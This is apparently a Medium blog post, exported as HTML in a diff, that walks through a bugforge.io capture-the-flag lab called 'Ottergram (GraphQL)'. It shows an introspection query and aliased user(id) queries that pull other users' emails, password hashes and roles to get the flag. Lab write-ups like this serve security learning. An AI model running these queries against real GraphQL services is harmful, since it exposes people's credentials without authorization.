@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Ottergram (GraphQL) Bugforge.io</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Ottergram (GraphQL) Bugforge.io</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Lab can be found at: https://bugforge.io
+</section>
+<section data-field="body" class="e-content">
+<section name="bdf6" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="de6c" id="de6c" class="graf graf--h3 graf--leading graf--title">Ottergram (GraphQL) Bugforge.io</h3><p name="59aa" id="59aa" class="graf graf--p graf-after--h3">Lab can be found at: <a href="https://bugforge.io" data-href="https://bugforge.io" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">https://bugforge.io</a></p><figure name="dfc7" id="dfc7" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*TELA2OxS4Tcg6_bydaig2w.png" data-width="600" data-height="338" src="https://cdn-images-1.medium.com/max/800/1*TELA2OxS4Tcg6_bydaig2w.png"></figure><p name="81e7" id="81e7" class="graf graf--p graf-after--figure">I registered an account and landed on the homepage:</p><figure name="ae90" id="ae90" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*oqfObtcEgfTto5L6oa_cAg.png" data-width="1002" data-height="1020" src="https://cdn-images-1.medium.com/max/800/1*oqfObtcEgfTto5L6oa_cAg.png"></figure><p name="8d0d" id="8d0d" class="graf graf--p graf-after--figure">After clicking the “settings” cog wheel in the top right, I saw a POST request to /graphql in burp:</p><figure name="79bf" id="79bf" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*fmdfkQlSRyh0dYpwuFBPFA.png" data-width="1716" data-height="1102" src="https://cdn-images-1.medium.com/max/800/1*fmdfkQlSRyh0dYpwuFBPFA.png"></figure><p name="0965" id="0965" class="graf graf--p graf-after--figure">From here, I could use introspection to look at what fields were available:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="json" name="d6ee" id="d6ee" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }&quot;</span><span class="hljs-punctuation">}</span></span></pre><figure name="155e" id="155e" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*4GAgYX3EYG1L_1b1d-PjEQ.png" data-width="1906" data-height="704" src="https://cdn-images-1.medium.com/max/800/1*4GAgYX3EYG1L_1b1d-PjEQ.png"></figure><p name="4f4c" id="4f4c" class="graf graf--p graf-after--figure">I could see that user’s contained: role, email, password etc all of the usual things you’d expect. So now, I had to see if I could pull back other user’s passwords:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="json" name="cb59" id="cb59" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;{ u1: user(id: 1) { id username email password role } }&quot;</span><span class="hljs-punctuation">}</span></span></pre><figure name="3413" id="3413" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*pVQPBGODnvl7SLr4yknXJQ.png" data-width="1910" data-height="726" src="https://cdn-images-1.medium.com/max/800/1*pVQPBGODnvl7SLr4yknXJQ.png"></figure><p name="422c" id="422c" class="graf graf--p graf-after--figure">I could see user 1 (otter_lover) and his bcrypt encrypted password. Now, user 2. And now, I had the flag:</p><figure name="7132" id="7132" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*YLabsKKs7odn-oDG3Y7_RA.png" data-width="1900" data-height="742" src="https://cdn-images-1.medium.com/max/800/1*YLabsKKs7odn-oDG3Y7_RA.png"></figure><p name="c056" id="c056" class="graf graf--p graf-after--figure">I could also look at all users with the following query:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="yaml" name="073a" id="073a" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">{<span class="hljs-string">&quot;query&quot;</span><span class="hljs-string">:&quot;</span>{ <span class="hljs-attr">u1:</span> <span class="hljs-string">user(id:</span> <span class="hljs-number">1</span><span class="hljs-string">)</span> { <span class="hljs-string">id</span> <span class="hljs-string">username</span> <span class="hljs-string">email</span> <span class="hljs-string">password</span> <span class="hljs-string">role</span> } <span class="hljs-attr">u2:</span> <span class="hljs-string">user(id:</span> <span class="hljs-number">2</span><span class="hljs-string">)</span> { <span class="hljs-string">id</span> <span class="hljs-string">username</span> <span class="hljs-string">email</span> <span class="hljs-string">password</span> <span class="hljs-string">role</span> } <span class="hljs-attr">u3:</span> <span class="hljs-string">user(id:</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> { <span class="hljs-string">id</span> <span class="hljs-string">username</span> <span class="hljs-string">email</span> <span class="hljs-string">password</span> <span class="hljs-string">role</span> } <span class="hljs-attr">u4:</span> <span class="hljs-string">user(id:</span> <span class="hljs-number">4</span><span class="hljs-string">)</span> { <span class="hljs-string">id</span> <span class="hljs-string">username</span> <span class="hljs-string">email</span> <span class="hljs-string">password</span> <span class="hljs-string">role</span> } }<span class="hljs-string">&quot;}</span></span></pre><figure name="9efc" id="9efc" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*7C31tTEO5zpbjZroKwpZIA.png" data-width="1908" data-height="918" src="https://cdn-images-1.medium.com/max/800/1*7C31tTEO5zpbjZroKwpZIA.png"></figure><p name="552e" id="552e" class="graf graf--p graf-after--figure">Thanks for following along!</p><p name="0a0a" id="0a0a" class="graf graf--p graf-after--p graf--trailing">🍺 Quick message to readers: if my writeups help you, please consider a small donation to my buymeacoffee link <a href="http://buymeacoffee.com/7s26simon" data-href="http://buymeacoffee.com/7s26simon" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">here</a>. This is not required but is very much appreciated! 🍺</p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@7s26simon" class="p-author h-card">7s26Simon</a> on <a href="https://medium.com/p/fc82260095d7"><time class="dt-published" datetime="2026-05-09T09:58:35.010Z">May 9, 2026</time></a>.</p><p><a href="https://medium.com/@7s26simon/ottergram-graphql-bugforge-io-fc82260095d7" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 13, 2026.</p></footer></article></body></html>
